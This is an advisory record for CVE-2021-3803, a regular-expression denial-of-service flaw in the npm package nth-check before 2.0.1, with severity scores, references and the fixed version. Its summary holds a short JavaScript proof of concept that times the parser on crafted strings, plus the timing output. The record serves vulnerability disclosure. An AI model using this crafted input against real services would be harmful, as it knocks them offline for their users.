advisory_id: GHSA-rp65-9cf3-cjxr
datasource_id: github_osv_importer_v2/GHSA-rp65-9cf3-cjxr
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/09/GHSA-rp65-9cf3-cjxr/GHSA-rp65-9cf3-cjxr.json
aliases:
  - CVE-2021-3803
summary: "Inefficient Regular Expression Complexity in nth-check\nThere is a Regular Expression\
  \ Denial of Service (ReDoS) vulnerability in nth-check that causes a denial of service when\
  \ parsing crafted invalid CSS nth-checks.\n\nThe ReDoS vulnerabilities of the regex are mainly\
  \ due to the sub-pattern `\\s*(?:([+-]?)\\s*(\\d+))?` with quantified overlapping adjacency\
  \ and can be exploited with the following code.\n\n**Proof of Concept**\n```js\n// PoC.js\n\
  var nthCheck = require(\"nth-check\")\nfor(var i = 1; i <= 50000; i++) {\n    var time = Date.now();\n\
  \    var attack_str = '2n' + ' '.repeat(i*10000)+\"!\";\n    try {\n        nthCheck.parse(attack_str)\
  \ \n    }\n    catch(err) {\n        var time_cost = Date.now() - time;\n        console.log(\"\
  attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\n    }\n}\n```\n\n\
  **The Output**\n```\nattack_str.length: 10003: 174 ms\nattack_str.length: 20003: 1427 ms\n\
  attack_str.length: 30003: 2602 ms\nattack_str.length: 40003: 4378 ms\nattack_str.length: 50003:\
  \ 7473 ms\n```"
impacted_packages:
  - purl: pkg:npm/nth-check
    affected_versions: vers:npm/<2.0.1
    fixed_versions: vers:npm/2.0.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/09/GHSA-rp65-9cf3-cjxr/GHSA-rp65-9cf3-cjxr.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1333
references:
  - url: https://github.com/fb55/nth-check
    reference_type:
    reference_id:
  - url: https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726
    reference_type:
    reference_id:
  - url: https://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0
    reference_type:
    reference_id:
  - url: https://lists.debian.org/debian-lts-announce/2023/05/msg00023.html
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2021-3803
    reference_type:
    reference_id: CVE-2021-3803
